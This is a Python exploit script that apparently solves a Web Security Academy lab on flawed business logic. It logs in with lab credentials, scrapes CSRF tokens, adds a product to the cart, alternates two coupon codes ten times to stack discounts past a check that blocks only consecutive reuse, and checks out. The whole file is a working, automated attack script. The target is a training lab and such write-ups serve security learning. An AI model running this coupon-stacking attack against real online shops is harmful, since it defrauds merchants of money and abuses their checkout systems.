import requests

DOMAIN = "0a5c000403c0f6ec855f8f8100e600cb.web-security-academy.net"

HEADERS = {
    "Host": DOMAIN,
    "Content-Type": "application/x-www-form-urlencoded",
    "Cookie": ""
}

COUPONS = ["NEWCUST5", "SIGNUP30"]

def get_initial_session():
    response = requests.get(f"https://{DOMAIN}/login", headers=HEADERS)
    HEADERS["Cookie"] = "session=" + response.headers["Set-Cookie"].split("session=")[1].split(";")[0]  + ";"

def get_csrf_token_login():
    response = requests.get(f"https://{DOMAIN}/login", headers=HEADERS)
    csrf_token = response.text.split('csrf" value="')[1].split('"')[0]
    return csrf_token

def login():
    csrf_token = get_csrf_token_login()
    data = {
        "csrf": csrf_token,
        "username": "wiener",
        "password": "peter"
    }
    response = requests.post(f"https://{DOMAIN}/login", headers=HEADERS, data=data)

    if "Your username is" in response.text:
        print("Logged in successfully")
        print("COOKIES: ", response.request.headers["Cookie"])

    HEADERS["Cookie"] = response.request.headers["Cookie"]

def add_to_cart(id=1):
    url = f"https://{DOMAIN}/cart"
    data = {
        "productId": id,
        "quantity": "1",
        "redir": "PRODUCT"
    }
    response = requests.post(url, headers=HEADERS, data=data, allow_redirects=False)

    if response.status_code == 302:
        print(f"Added product {id} to cart")

def get_csrf_token_coupon():
    response = requests.get(f"https://{DOMAIN}/cart", headers=HEADERS)
    csrf_token = response.text.split('csrf" value="')[1].split('"')[0]
    return csrf_token

def apply_coupon(coupon):
    csrf_token = get_csrf_token_coupon()
    data = {
        "csrf": csrf_token,
        "coupon": coupon
    }
    response = requests.post(f"https://{DOMAIN}/cart/coupon", headers=HEADERS, data=data)

def exploit_coupon():
    for i in range(10):
        apply_coupon(COUPONS[i % 2])
        print(f"Applied coupon {COUPONS[i % 2]}")

    get_cart()

def get_csrf_token_checkout():
    response = requests.get(f"https://{DOMAIN}/cart", headers=HEADERS)
    csrf_token = response.text.split('csrf" value="')[1].split('"')[0]
    return csrf_token

def get_cart():
    response = requests.get(f"https://{DOMAIN}/cart", headers=HEADERS)
    print(response.text)

def checkout():
    csrf_token = get_csrf_token_checkout()
    data = {
        "csrf": csrf_token
    }
    response = requests.post(f"https://{DOMAIN}/cart/checkout", headers=HEADERS, data=data, allow_redirects=False)

    print(response.text)
    if response.status_code == 303:
        print("Checked out successfully")

get_initial_session()
login()
add_to_cart()
exploit_coupon()
checkout()